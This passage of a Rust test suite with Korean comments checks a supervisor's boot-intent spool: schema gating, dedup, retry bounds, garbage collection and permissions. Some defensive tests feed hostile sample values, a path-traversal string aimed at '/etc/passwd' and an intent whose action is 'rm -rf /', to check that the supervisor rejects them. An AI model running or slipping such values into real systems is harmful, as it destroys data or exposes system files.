                "미지 토큰이 실행 후보가 됐다: {hostile:?}"
            );
        }
    }

    /// 판정 우선순위 전수 — 형상 → 미지 → 만료 → 예산 → 쿨다운 → 실행.
    #[test]
    fn decide_truth_table() {
        let base = intent("i");
        assert_eq!(decide(&base, 0, 1000.0), Disposition::Run(BootAction::EnsureTeam));
        let mut bad_v = base.clone();
        bad_v.v = INTENT_SCHEMA_V + 1;
        assert_eq!(decide(&bad_v, 0, 1000.0), Disposition::Retire("schema_mismatch"));
        // (P2 · v2) 구 스키마(v1)도 같은 폐기다 — 다운그레이드/업그레이드 스큐 양방향 fail-closed.
        let mut old_v = base.clone();
        old_v.v = 1;
        assert_eq!(decide(&old_v, 0, 1000.0), Disposition::Retire("schema_mismatch"));
        // (P2 · v2) decl_origin 닫힌 토큰 — 인정 토큰은 통과, 미지값은 실행이 아니라 폐기.
        let mut human = base.clone();
        human.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        assert_eq!(decide(&human, 0, 1000.0), Disposition::Run(BootAction::EnsureTeam));
        let mut forged = base.clone();
        forged.decl_origin = "hook-machine".into();
        assert_eq!(
            decide(&forged, 0, 1000.0),
            Disposition::Retire("unknown_decl_origin"),
            "미지 decl_origin 이 실행 후보가 됐다(닫힌 토큰 계약 위반)"
        );
        // 만료가 예산보다 앞이다(늙은 인텐트가 예산을 태우며 프로세스를 낳지 않게).
        assert_eq!(
            decide(&base, 0, 1000.0 + INTENT_MAX_AGE_SECS + 1.0),
            Disposition::Retire("expired")
        );
        assert_eq!(
            decide(&base, MAX_ATTEMPTS, 1000.0),
            Disposition::Retire("attempts_exhausted")
        );
        let mut cooling = base.clone();
        cooling.next_attempt_at = 1200.0;
        assert_eq!(decide(&cooling, 1, 1000.0), Disposition::Wait { until: 1200.0 });
        assert_eq!(decide(&cooling, 1, 1200.0), Disposition::Run(BootAction::EnsureTeam));
    }

    /// 디스크가 거짓말해도 예산은 유계다.
    #[test]
    fn effective_attempts_takes_the_larger_budget() {
        assert_eq!(effective_attempts(0, 3), 3, "디스크 0 · 메모리 3 → 3");
        assert_eq!(effective_attempts(2, 0), 2);
        assert_eq!(effective_attempts(1, 1), 1);
    }

    /// 파일명이 되는 값이므로 경로 탈출이 불가능해야 한다.
    #[test]
    fn sanitize_id_cannot_escape_the_spool() {
        for hostile in ["../../etc/passwd", "a/b", "..", "", "  ", "x\0y"] {
            let s = sanitize_id(hostile);
            assert!(!s.contains('/'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains('\\'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains(".."), "상대참조 잔존: {s:?}");
            assert!(!s.is_empty(), "빈 파일명");
        }
        assert_eq!(sanitize_id("boot-master_1"), "boot-master_1", "정상 id 보존");
    }

    // ── 스풀·틱 (합성 표본) ────────────────────────────────────────────────────

    /// 왕복 직렬화 — 적은 것을 그대로 읽는다(스키마 **v2** 왕복: decl_origin·claim{rc,at} 보존).
    #[test]
    fn enqueue_roundtrips() {
        let dir = tmp_spool("roundtrip");
        enqueue_in(
            &dir,
            &EnqueueReq {
                decl_id: "boot-1",
                action: BootAction::EnsureTeam,
                lane: "/tmp/s.sock",
                surface_id: Some(7),
                reason: "hook",
                decl_origin: DECL_ORIGIN_HOOK_HUMAN,
                claim_rc: Some(0),
                claim_at: Some(499.0),
                executor: EXECUTOR_RUNNER,
            },
            500.0,
        )
        .unwrap();
        let scan = scan_spool(&dir, 500.0, 0);
        assert_eq!(scan.intents.len(), 1);
        let it = &scan.intents[0];
        assert_eq!(it.id, "boot-1");
        assert_eq!(it.v, INTENT_SCHEMA_V, "쓰는 버전은 항상 현재 스키마(v3)");
        assert_eq!(it.action_token, "ensure-team");
        assert_eq!(it.surface_id, Some(7));
        assert_eq!(it.attempts, 0);
        assert_eq!(it.decl_origin, DECL_ORIGIN_HOOK_HUMAN, "v2 decl_origin 왕복 소실");
        assert_eq!(it.claim_rc, Some(0), "v2 claim.rc 왕복 소실");
        assert_eq!(it.claim_at, Some(499.0), "v2 claim.at 왕복 소실");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let m = std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "스풀 디렉터리 권한 재강제 실패: {m:o}");
        }
    }

    /// ★H-ENQ-ATOMIC-1(부트 v2 · 명세 §2-5): 같은 `decl_id` 를 여러 번 밀어 넣어도 **파일은
    /// 하나**이고 응답은 `enqueued` 1 + `dedup` n-1 이다.
    ///
    /// 왜 이 축이 중요한가: 종전 id 는 매 호출이 새 값이라 **같은 선언 이벤트의 재전송**(훅
    /// 재실행·중복 배달)이 인텐트를 하나 더 낳았다 = 같은 좌석에 부트 둘. 유일성을 커널
    /// (`O_EXCL`)에 맡기는 것이 이 검체가 지키는 계약이다.
    #[test]
    fn enqueue_is_atomic_on_decl_id() {
        let dir = tmp_spool("atomic");
        let mut enq = 0;
        let mut dedup = 0;
        for _ in 0..8 {
            match enqueue_in(&dir, &req("d-same", Some(7)), 100.0).unwrap() {
                EnqueueOutcome::Enqueued { .. } => enq += 1,
                EnqueueOutcome::Dedup { .. } => dedup += 1,
                other => panic!("예상 밖 귀결: {other:?}"),
            }
        }
        assert_eq!((enq, dedup), (1, 7), "원자 insert 실패 — 재전송이 인텐트를 늘렸다");
        let files: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.ends_with(".json"))
            .collect();
        assert_eq!(files.len(), 1, "파일이 하나가 아니다: {files:?}");
        // decl_id 는 재료가 같으면 같고, 하나만 달라도 갈린다(구분자 없는 연접 사고 차단).
        let a = compute_decl_id("/l.sock", Some(7), "sess", "dig");
        assert_eq!(a, compute_decl_id("/l.sock", Some(7), "sess", "dig"), "결정론 위반");
        assert_ne!(a, compute_decl_id("/l.sock", Some(7), "ses", "sdig"), "구분자 부재 충돌");
        assert_ne!(a, compute_decl_id("/l.sock", Some(8), "sess", "dig"), "좌석 축 미반영");
        assert_eq!(a.len(), 32, "id 길이 계약(파일명 예산)");
    }

    /// ★H-ENQ-SUPERSEDE-1(명세 §2-5 · G1): 같은 좌석에 진행 중 인텐트가 있는데 다른 선언이
    /// 오면 **기록 1 · 실행 0** 이다. 기록조차 안 하면 오너에겐 "선언했는데 흔적이 없다" 가
    /// 되고, 실행까지 하면 같은 좌석에 부트가 둘이 된다 — 그 사이의 유일한 정답이 superseded.
    #[test]
    fn second_declaration_on_a_busy_surface_is_superseded_not_run() {
        let d = tmp_daemon("supersede");
        let dir = tmp_spool("supersede");
        assert!(matches!(
            enqueue_in(&dir, &req("first", Some(7)), 100.0).unwrap(),
            EnqueueOutcome::Enqueued { .. }
        ));
        let out = enqueue_in(&dir, &req("second", Some(7)), 101.0).unwrap();
        match &out {
            EnqueueOutcome::Superseded { by, path } => {
                assert_eq!(by, "first");
                assert!(
                    path.to_string_lossy().ends_with(DONE_SUFFIX),
                    "superseded 기록이 즉시 .done 으로 닫히지 않았다: {path:?}"
                );
            }
            other => panic!("superseded 가 아니다: {other:?}"),
        }
        // ★음성 대조 — 실행은 **한 번뿐**이다(두 인텐트가 다 돌면 좌석에 부트가 둘).
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 200.0);
        assert_eq!(n, 1, "superseded 인텐트까지 실행됐다 — G1 위반");
        // 다른 좌석의 선언은 superseded 대상이 아니다(과잉 억제 차단).
        assert!(matches!(
            enqueue_in(&dir, &req("other-seat", Some(9)), 102.0).unwrap(),
            EnqueueOutcome::Enqueued { .. }
        ));
    }

    /// ★H-ENQ-REDECLARE-1(시뮬 **T1-3** — 명세만 읽고 짰다면 났을 사고): 오너가 같은 프롬프트를
    /// **실패 후 다시** 치면 그것은 정당한 재선언이다.
    ///
    /// 파일명이 `<decl_id>.json` 이고 terminal 파일이 GC 될 때까지 남아 있으면 `O_EXCL` 이
    /// 실패해 `dedup` 으로 접힌다 = **재선언이 삼켜진다**(G1 위반). terminal 전이 시점의
    /// `.done` rename 이 그것을 막는다 — 이 검체가 그 한 줄을 지킨다.
    #[test]
    fn redeclaration_after_terminal_is_not_swallowed_as_dedup() {
        let dir = tmp_spool("redeclare");
        let first = enqueue_in(&dir, &req("same-decl", Some(7)), 100.0).unwrap();
        assert!(matches!(first, EnqueueOutcome::Enqueued { .. }));
        // 앞 인텐트를 종착시킨다(러너가 완주했거나 감독자가 접은 상태).
        let it = intent("same-decl");
        close_intent(&dir, &it, Terminal::new(TerminalKind::Completed, "", ""), 150.0).unwrap();
        // ★같은 decl_id 로 다시 선언 — dedup 이 아니라 새 인텐트여야 한다.
        let again = enqueue_in(&dir, &req("same-decl", Some(7)), 200.0).unwrap();
        assert!(
            matches!(again, EnqueueOutcome::Enqueued { .. }),
            "정당한 재선언이 삼켜졌다(T1-3 회귀): {again:?}"
        );
        // ★그리고 닫힌 인텐트는 **다시 실행되지 않는다**(.done 이 남아 있어도).
        let closed = intent("x");
        let mut term = closed.clone();
        term.state = IntentState::Terminal;
        term.terminal = Some(Terminal::new(TerminalKind::Completed, "", ""));
        assert_eq!(decide(&term, 0, 1000.0), Disposition::Retire("already_terminal"));
    }

    /// ★H-TERMINAL-1(명세 §3-2): terminal 대수는 **11종 전수**이고 철자 왕복이 항등이며,
    /// 감독자의 구 `Retire` 사유가 **빠짐없이** 이 표로 합류한다.
    #[test]
    fn terminal_algebra_is_total_and_roundtrips() {
        assert_eq!(TerminalKind::ALL.len(), 11, "명세 §3-2 의 종착 수와 다르다");
        let mut seen = std::collections::BTreeSet::new();
        for k in TerminalKind::ALL {
            assert!(seen.insert(k.as_str()), "철자 중복: {}", k.as_str());
            assert_eq!(TerminalKind::parse(k.as_str()), Some(k), "왕복 실패: {}", k.as_str());
        }
        assert_eq!(TerminalKind::parse("made-up"), None, "미지 토큰이 통과했다(fail-closed 위반)");
        // 구 폐기 사유 전수 — 하나도 표 밖으로 새지 않는다.
        for why in [
            "schema_mismatch", "unknown_action", "unknown_decl_origin", "expired",
            "attempts_exhausted", "claim_stale", "no_surface", "already_terminal",
        ] {
            let k = TerminalKind::from_retire_reason(why);
            assert!(TerminalKind::ALL.contains(&k), "{why} 가 표 밖으로 샜다");
        }
        assert_eq!(TerminalKind::from_retire_reason("expired"), TerminalKind::Expired);
        assert_eq!(
            TerminalKind::from_retire_reason("attempts_exhausted"),
            TerminalKind::AttemptsExhausted
        );
        assert_eq!(TerminalKind::from_retire_reason("claim_stale"), TerminalKind::Aborted);
        // 상태 enum 도 같은 계약(미지 = None → 호출부가 pending 으로 승격).
        for st in [IntentState::Pending, IntentState::Running, IntentState::Terminal] {
            assert_eq!(IntentState::parse(st.as_str()), Some(st));
        }
        assert_eq!(IntentState::parse("halfway"), None);
    }

    /// ★schema 2 **승격 판독**(명세 §5): 구 데몬이 남긴 인텐트는 폐기가 아니라 기본값 승격이다.
    /// 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않는 것이 이 계약의 목적이다.
    #[test]
    fn schema_two_intents_are_promoted_not_retired() {
        let dir = tmp_spool("promote");
        raw_intent(
            &dir,
            "legacy",
            r#"{"v":2,"action":"ensure-team","created_at":0.0,"surface_id":7,"decl_origin":"hook-human"}"#,
        );
        let scan = scan_spool(&dir, 1.0, 0);
        assert_eq!(scan.intents.len(), 1, "구 스키마가 스캔에서 사라졌다");
        let it = &scan.intents[0];
        assert_eq!(it.v, INTENT_SCHEMA_V_LEGACY);
        assert_eq!(it.decl_id, "legacy", "decl_id 부재 → 파일명으로 승격되어야 한다");
        assert_eq!(it.state, IntentState::Pending, "state 부재 → 가장 보수적인 pending");
        assert_eq!(it.generation, 0);
        assert!(it.terminal.is_none());
        assert!(it.executor.is_empty(), "executor 는 디스패치 시점에 채운다(순수 판독 유지)");
        // ★핵심: **실행 후보로 남는다**(폐기가 아니다).
        assert_eq!(decide(it, 0, 1.0), Disposition::Run(BootAction::EnsureTeam));
        // 음성 대조 — 미래 스키마·v1 은 여전히 fail-closed.
        let mut future = intent("f");
        future.v = INTENT_SCHEMA_V + 1;
        assert_eq!(decide(&future, 0, 1.0), Disposition::Retire("schema_mismatch"));
        let mut v1 = intent("o");
        v1.v = 1;
        assert_eq!(decide(&v1, 0, 1.0), Disposition::Retire("schema_mismatch"));
    }

    /// ★롤백 스위치 판독(명세 §5) — 기본 켜짐, `0` 만 끔. `supervisor_off_from` 과 **극성이
    /// 반대**라 한쪽을 복사해 쓰면 조용히 뒤집힌다.
    #[test]
    fn boot_v2_switch_defaults_on_and_only_zero_turns_it_off() {
        assert!(boot_v2_enabled_from(None), "미설정은 켜짐이어야 한다");
        assert!(boot_v2_enabled_from(Some("")), "빈값은 켜짐");
        assert!(boot_v2_enabled_from(Some("1")));
        assert!(boot_v2_enabled_from(Some("yes")));
        assert!(!boot_v2_enabled_from(Some("0")), "0 이 끔이어야 한다");
        // 극성 대조 — 두 스위치를 헷갈리면 롤백이 정반대로 동작한다.
        assert!(supervisor_off_from(Some("0"), None));
        assert!(!supervisor_off_from(None, None));
    }

    /// ★유계성 — 실패하는 실행자에 대해 디스패치 총량이 `MAX_ATTEMPTS` 를 넘지 않는다.
    /// (틱을 100회 돌려도 프로세스는 3번만 태어난다.)
    #[test]
    fn retry_is_bounded_by_max_attempts() {
        let d = tmp_daemon("bounded");
        let dir = tmp_spool("bounded");
        enqueue_in(&dir, &req("b", None), 0.0).unwrap();
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..100 {
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(total, MAX_ATTEMPTS as usize, "재시도가 유계가 아니다(폭주 경로)");
        assert!(
            !intent_path(&dir, "b").exists(),
            "예산 소진 인텐트가 스풀에 남았다 — 다음 세대가 다시 태운다"
        );
    }

    /// ★읽기전용 스풀(디스크가 예산을 못 올림)에서도 유계여야 한다 — 메모리측 예산 단독 시험.
    #[test]
    fn budget_is_bounded_even_when_disk_never_persists() {
        let d = tmp_daemon("nopersist");
        let dir = tmp_spool("nopersist");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..50 {
            // 매 틱 인텐트를 attempts=0 으로 되살린다 = 디스크 예산이 영원히 오르지 않는 상황.
            raw_intent(
                &dir,
                "z",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":0.0,"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "디스크 예산이 오르지 않는 상황에서 {total}회 디스패치 — 메모리측 유계가 없다(폭주)"
        );
    }

    /// 틱당 디스패치 상한 — 스풀 홍수가 한 틱에 프로세스 떼를 낳지 않는다.
    #[test]
    fn dispatch_per_tick_is_capped() {
        let d = tmp_daemon("flood");
        let dir = tmp_spool("flood");
        for i in 0..40 {
            enqueue_in(&dir, &req(&format!("f{i:03}"), None), 0.0).unwrap();
        }
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0);
        assert_eq!(n, MAX_DISPATCH_PER_TICK, "틱당 상한 위반 — 폭주 차단 실패");
    }

    /// 성공하면 인텐트는 사라진다(재실행 0).
    #[test]
    fn success_retires_the_intent() {
        let d = tmp_daemon("success");
        let dir = tmp_spool("success");
        enqueue_in(&dir, &req("s", None), 0.0).unwrap();
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        assert!(!intent_path(&dir, "s").exists(), "성공 후에도 인텐트가 남았다");
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 100.0), 0, "재실행이 일어났다");
    }

    /// 합성 표본 — 적대적/깨진 인텐트는 **실행되지 않고** 사라진다.
    #[test]
    fn hostile_and_broken_intents_are_discarded_without_running() {
        let d = tmp_daemon("hostile");
        let dir = tmp_spool("hostile");
        raw_intent(&dir, "cmd", r#"{"v":2,"action":"rm -rf /","created_at":0.0}"#);
        raw_intent(&dir, "oldv", r#"{"v":99,"action":"ensure-team","created_at":0.0}"#);
        raw_intent(&dir, "junk", "not json at all");
        raw_intent(&dir, "noact", r#"{"v":2,"created_at":0.0}"#);
        // (P2 · v2) 구 스키마(v1)·미지 decl_origin — 둘 다 실행 0·폐기(fail-closed 유지).
        raw_intent(&dir, "oldschema", r#"{"v":1,"action":"ensure-team","created_at":0.0}"#);
        raw_intent(
            &dir,
            "forged",
            r#"{"v":2,"action":"ensure-team","created_at":0.0,"decl_origin":"hook-machine"}"#,
        );
        std::fs::write(dir.join("ignored.log"), "log line").unwrap();
        let mut st = SupState::default();
        // 실행자가 불리면 즉시 실패시켜 '실행 0' 을 증명한다.
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            panic!("적대적/깨진 인텐트가 실행됐다 — 스풀이 명령 실행 표면이 됐다");
        }
        assert_eq!(tick_in(&d, &dir, &mut st, never, remove_spool_file, 1.0), 0);
        for id in ["cmd", "oldv", "junk", "noact", "oldschema", "forged"] {
            assert!(!intent_path(&dir, id).exists(), "{id} 가 스풀에 남았다");
        }
        assert!(dir.join("ignored.log").exists(), "인텐트가 아닌 파일을 지웠다");
    }

    /// 디스크 mtime GC — **파싱은 되지만 파일이 늙은** 인텐트가 사라진다.
    ///
    /// ★검체 설계 주의(계측 타당성 실측 2026-08-24): 처음엔 본문을 `{ broken` 으로 두었는데,
    /// 그러면 `unparsable` 경로가 같은 파일을 지워 **mtime GC 를 통째로 떼어내도 초록**이었다
    /// (두 경로가 같은 표본을 덮어 판정이 공전). 그래서 표본을 "파싱 성공 · `created_at` 은
    /// 미래라 `expired` 도 아님 · 그러나 **파일 mtime 이 늙음**" 으로 좁혀, mtime GC 만이
    /// 지울 수 있는 상태로 만든다. 실행자는 실패자다 — GC 가 없으면 인텐트가 **실행되고**
    /// 파일도 남으므로 두 축(디스패치 0 · 파일 부재)이 동시에 무너진다.
    #[test]
    fn stale_files_are_gc_ed_by_mtime() {
        let d = tmp_daemon("mtimegc");
        let dir = tmp_spool("mtimegc");
        // 파일 mtime = '지금'. 판정 시각을 수명 너머로 주되 `created_at` 도 같이 옮겨
        // `expired`(decide) 가 아니라 **mtime GC**(scan) 만이 유일한 제거 경로가 되게 한다.
        let future = now_epoch() + INTENT_MAX_AGE_SECS + 60.0;
        raw_intent(
            &dir,
            "old",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                    "created_at":{future},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
            ),
        );
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, future);
        assert_eq!(n, 0, "mtime 이 늙은 인텐트가 실행됐다 — mtime GC 미동작");
        assert!(!intent_path(&dir, "old").exists(), "mtime GC 미동작(파일 잔존)");
    }

    /// 감독자는 스풀을 **만들지 않는다**(생산자의 일). 있으면 권한만 조인다.
    #[test]
    fn tick_never_creates_the_spool_but_tightens_it_when_present() {
        let d = tmp_daemon("perm");
        let root = tmp_spool("perm");
        let missing = root.join("nope");
        let mut st = SupState::default();
        tick_in(&d, &missing, &mut st, ok_runner, remove_spool_file, 1.0);
        assert!(!missing.exists(), "감독자가 스풀을 만들었다 — 프로덕션 디스크 자국 0 계약 위반");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            // ★(R2 정정) 넓은 권한의 스풀을 모사한다 — 정상 경로의 writer 는 데몬 하나이므로
            //   (0700 원자 기록) 이 형상의 출처는 **구 릴리스가 남긴 스풀·수동 조작·복원
            //   도구**다. 재강제는 그 잔여에 대한 방어이고 이 검체가 그것을 잰다.
            std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
            tick_in(&d, &root, &mut st, ok_runner, remove_spool_file, 1.0);
            let m = std::fs::metadata(&root).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "틱이 스풀 권한을 재강제하지 않았다: {m:o}");
        }
    }

    /// 파싱 불가 인텐트는 **mtime 과 무관하게** 즉시 폐기된다(위 검체가 좁힌 축의 형제 축).
    #[test]
    fn unparsable_files_are_discarded_regardless_of_mtime() {
        let d = tmp_daemon("unparsable");
        let dir = tmp_spool("unparsable");
        raw_intent(&dir, "junk", "{ broken");
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now_epoch());
        assert_eq!(n, 0, "깨진 인텐트가 실행됐다");
        assert!(!intent_path(&dir, "junk").exists(), "깨진 인텐트가 스풀에 남았다");
    }

    /// 예산 맵 3종 방어 — 상한 초과 시 통째로 비운다.
    #[test]
    fn budget_map_is_capped_and_pruned() {
        let d = tmp_daemon("mapcap");
        let dir = tmp_spool("mapcap");
        let mut st = SupState::default();
        let now = 10_000.0;
        for i in 0..(MAX_TRACKED + 10) {
            st.budget.insert(format!("k{i}"), (1, now));
        }
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
        assert!(st.budget.len() <= MAX_TRACKED, "상한 방어 실패: {}", st.budget.len());
        // 나이 만료 — 스풀에 없고 늙은 항목은 다음 틱에 사라진다.
        st.budget.insert("aged".into(), (1, 0.0));
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, INTENT_MAX_AGE_SECS + 10.0);
        assert!(!st.budget.contains_key("aged"), "나이 만료 방어 실패");
    }

    // ── ★유계성 검체 (재난 ① 이벤트 폭주) ─────────────────────────────────────
    //
    // 아래 셋의 계수기는 전부 **버스**(`daemon.bus.latest_seq()`)다 — `tick_in` 의 반환값이
    // 아니다. 산출자가 자기 산출물의 통과를 판정하지 않는다는 규율의 이 파일 판본이며,
    // 발행 경로를 하나라도 우회해 넣으면 그 순간 카운트가 어긋나 적색이 된다.

    /// ★삭제가 **계속 실패해도** 이벤트 총량은 유계다 (결함 1).
    ///
    /// 종전 구현은 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다. 지워지지 않는 항목
    /// 하나가 감독자 cadence(3초)마다 영구히 이벤트를 낸다 = 재난 ① 그 자체이며, 스풀이
    /// 읽기전용이 되는 Windows 가 주 경로다(`ensure_spool` 의 권한 재강제는 `#[cfg(unix)]`).
    ///
    /// 두 삭제 경로(garbage GC · Retire)를 **함께** 건다 — 한쪽만 고치면 다른 쪽이 계속 샌다.
    #[test]
    fn undeletable_spool_entries_do_not_publish_forever() {
        let d = tmp_daemon("undeletable");
        let dir = tmp_spool("undeletable");
        raw_intent(&dir, "junk", "{ broken"); // ① 파싱 불가 → garbage GC 축
        raw_intent(&dir, "unknown", r#"{"v":2,"action":"rm -rf /","created_at":0.0}"#); // ② Retire 축
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        for _ in 0..200 {
            assert_eq!(
                tick_in(&d, &dir, &mut st, fail_runner, never_removes, 1.0),
                0,
                "지워지지 않는 쓰레기가 실행 후보가 됐다"
            );
        }
        let published = d.bus.latest_seq() - before;
        // ★조성 갱신(R2 — 약화 아님, 상한 이동): `unknown` 은 `unknown_action` 폐기 = **스폰
        //   0회 종착**이라 이제 loud 통보(feed.item.created 1건)가 붙는다. 조성:
        //   intent_discarded(junk) 1 + intent_retired(unknown) 1 + feed(무스폰 통보·래치) 1 = 3.
        //   유계 판정력은 종전과 동일하다 — 셋 다 래치라 200틱을 돌아도 늘지 않으며, 어느
        //   하나가 매 틱 반복되면 즉시 이 상한을 뚫는다.
        assert_eq!(
            published, 3,
            "삭제 실패 항목 2건이 200틱 동안 이벤트 {published}건을 냈다 \
             — 항목당 1건(사실은 알리되 반복하지 않는다)이어야 한다(재난 ①)"
        );
        // ★침묵도 실패다 — 지워지지 않는 스풀 항목은 **한 번은** 알려야 한다.
        assert!(published > 0, "삭제 실패를 통째로 삼켰다 — 무음 실패");
    }

    /// ★예산 맵 상한 집행이 **살아있는 인텐트의 예산을 리셋하지 않는다** (결함 2a).
    ///
    /// 시나리오는 두 축(디스크·메모리)을 함께 둔 **바로 그 이유**다: 스풀이 읽기전용이라
    /// 디스크측 `attempts` 가 영원히 0 이고(디스크 축 붕괴), 그 상태에서 예산 맵이 상한을
    /// 넘는다. 종전 구현은 그때 맵을 `clear()` 해 **메모리 축까지 함께** 무너뜨렸다 —
    /// 남는 유계가 하나도 없어 인텐트 하나가 매 틱 프로세스를 낳는다.
    #[test]
    fn budget_cap_never_resets_a_live_intents_budget() {
        let d = tmp_daemon("capreset");
        let dir = tmp_spool("capreset");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for tick in 0..60 {
            // 디스크가 예산을 못 올리는 상황 — 매 틱 attempts=0 으로 되살아난다.
            raw_intent(
                &dir,
                "live",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":{now},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            // 맵을 매 틱 상한 너머로 밀어 올린다(인텐트가 쏟아지는 24/365 데몬의 형태).
            for i in 0..(MAX_TRACKED + 10) {
                st.budget.insert(format!("t{tick}k{i}"), (1, now));
            }
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "예산 맵 상한 집행이 살아있는 인텐트의 예산까지 지웠다 — {total}회 디스패치 \
             (인텐트당 {MAX_ATTEMPTS}회 상한 무력화 = 폭주)"
        );
        assert!(
            st.budget.len() <= MAX_TRACKED + MAX_DISPATCH_PER_TICK,
            "예산 맵이 상한 위로 자란다: {} (누수)",
            st.budget.len()
        );
    }

    /// ★GC 는 **판정 상한과 독립**으로 돈다 (결함 2b).
    ///
    /// 정렬 앞쪽을 살아있는 인텐트로 가득 채우고(`a###`), 뒤쪽에 파싱 불가 쓰레기를 둔다
    /// (`z###`). 판정 상한(64) 안쪽만 GC 대상이면 뒤쪽은 **영원히** 지워지지 않는다 =
    /// 스풀 무한 성장. 쓰레기 수를 GC 상한보다 크게 잡아 **회전 커서**가 없으면 초록이
    /// 될 수 없게 만든다(상한을 키우는 것만으로는 이 검체를 통과할 수 없다).
    #[test]
    fn gc_is_not_starved_by_the_judgement_cap() {
        let d = tmp_daemon("gcstarve");
        let dir = tmp_spool("gcstarve");
        for i in 0..MAX_SCAN_ENTRIES {
            enqueue_in(&dir, &req(&format!("a{i:03}"), None), 0.0).unwrap();
        }
        const GARBAGE: usize = 400; // > MAX_GC_ENTRIES — 상한만 키우는 수리는 통과 못 한다.
        for i in 0..GARBAGE {
            raw_intent(&dir, &format!("z{i:03}"), "{ broken");
        }
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..20 {
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
            now += 5.0;
        }
        let left = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().starts_with('z'))
            .count();
        assert_eq!(
            left, 0,
            "판정 상한 뒤쪽 쓰레기 {left}건이 GC 되지 않았다 — 스풀이 무한 성장한다"
        );
    }

    /// ★**성공했는데 파일이 지워지지 않는** 경우에도 낳는 프로세스와 이벤트는 유계다.
    ///
    /// 삭제 실패의 가장 나쁜 형태는 GC 축이 아니라 **성공 축**이다: 성공 후 인텐트가 남으면
    /// 다음 틱이 같은 인텐트를 다시 실행한다. 여기서 유계를 세우는 것은 예산 두 축이고,
    /// 마지막 `attempts_exhausted` 폐기 이벤트도 음성 캐시가 1건으로 접는다.
    #[test]
    fn successful_dispatch_with_undeletable_intent_is_still_bounded() {
        let d = tmp_daemon("okundeletable");
        let dir = tmp_spool("okundeletable");
        enqueue_in(&dir, &req("s", None), 0.0).unwrap();
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..200 {
            total += tick_in(&d, &dir, &mut st, ok_runner, never_removes, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(
            total, MAX_ATTEMPTS as usize,
            "지워지지 않는 인텐트가 성공 경로에서 {total}회 프로세스를 낳았다(폭주)"
        );
        // ★핀 개정(P2 · 오너 결정 ⑧c — 약화 아님, 조성 갱신): 소진 종착이 loud 로 격상되어
        //   `attempts_exhausted` 폐기 시 feed 통보(feed.item.created) 1건이 **추가**됐다.
        //   조성: dispatched 3 + intent_retired 1 + feed(소진 통보·래치 1회) 1 = 5 ≤ 7
        //   (원장 record_audited 는 성공 시 무발행). 상한 7 은 그대로 두되, 통보가 래치로
        //   1회를 넘으면(매 틱 반복) 즉시 이 상한을 뚫으므로 유계 판정력은 종전과 동일하다.
        let published = d.bus.latest_seq() - before;
        assert!(
            published <= 7,
            "200틱 동안 이벤트 {published}건 — 삭제 실패·소진 통보가 발행을 영구화했다"
        );
        // 소진 loud 통보는 정확히 1건이어야 한다(래치 — 200틱 반복 금지).
        let fails = d
            .feed_items
            .lock()
            .unwrap()
            .iter()
            .filter(|i| i.kind == "bootstrap-fail")
            .count();
        assert_eq!(fails, 1, "소진 통보가 (인텐트당 1회) 접히지 않았다: {fails}건");
    }

    // ── (P2) 신설 계약 검체 ────────────────────────────────────────────────────

    /// ★(R3-RISK-1) kill-switch 게이트 — pause 중에는 낳지도 지우지도 않는다.
    #[test]
    fn paused_daemon_freezes_the_supervisor_tick() {
        let d = tmp_daemon("paused");
